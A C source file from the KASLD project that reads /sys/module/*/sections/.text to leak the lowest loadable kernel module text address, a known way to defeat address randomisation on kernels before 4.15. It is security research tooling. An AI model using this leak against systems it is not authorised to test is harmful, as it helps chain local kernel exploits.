// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Retrieve virtual address for loadable kernel modules from
// /sys/module/*/sections/.text
//
// Kernel module section offsets were exposed world-readable in SysFS from 2004.
// Permissions were modified to prevent access (unless `kptr_restrict = 0`) in
// kernel 4.15-rc1 on 2017-11-12:
// https://github.com/torvalds/linux/commit/277642dcca765a1955d4c753a5a315ff7f2eb09d
// ---
// <bcoles@gmail.com>

#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "kasld.h"

unsigned long read_module_text(char *path) {
  // printf("[.] checking %s ...\n", path);

  FILE *f = fopen(path, "rb");
  if (f == NULL) {
    // printf("[-] open/read(%s): %m\n", path);
    return 0;
  }

  unsigned int buff_len = 64;
  char buff[buff_len];

  if (fgets(buff, buff_len, f) == NULL) {
    // printf("[-] fgets(%s): %m\n", path);
    fclose(f);
    return 0;
  }

  fclose(f);

  const int addr_len = sizeof(long*) * 2;
  // pointer hex string length + "0x" prefix + "\n" line feed
  if (strlen(buff) != addr_len + 3)
    return 0;

  char *endptr;
  unsigned long addr = (unsigned long)strtoull(buff, &endptr, 16);

  // modules may be mapped below kernel text
  if (addr && addr < KERNEL_BASE_MAX)
    return addr;

  return 0;
}

unsigned long get_module_text_sysfs() {
  struct dirent *dir;
  const char *path = "/sys/module/";
  DIR *d = opendir(path);

  if (d == NULL) {
    printf("opendir(%s): %m\n", path);
    return 0;
  }

  char d_path[1024];
  unsigned long addr = 0;
  unsigned long text_addr = 0;

  while ((dir = readdir(d)) != NULL) {
    if (dir->d_type != DT_DIR)
      continue;

    snprintf(d_path, sizeof(d_path), "%s%s/sections/.text", path, dir->d_name);
    text_addr = read_module_text(d_path);

    if (!text_addr)
      continue;

    if (!addr || text_addr < addr)
      addr = text_addr;
  }

  closedir(d);

  return addr;
}

int main(int argc, char **argv) {
  printf("[.] trying /sys/modules/*/sections/.text ...\n");

  unsigned long addr = get_module_text_sysfs();
  if (!addr)
    return 1;

  printf("lowest leaked module text address: %lx\n", addr);

  return 0;
}
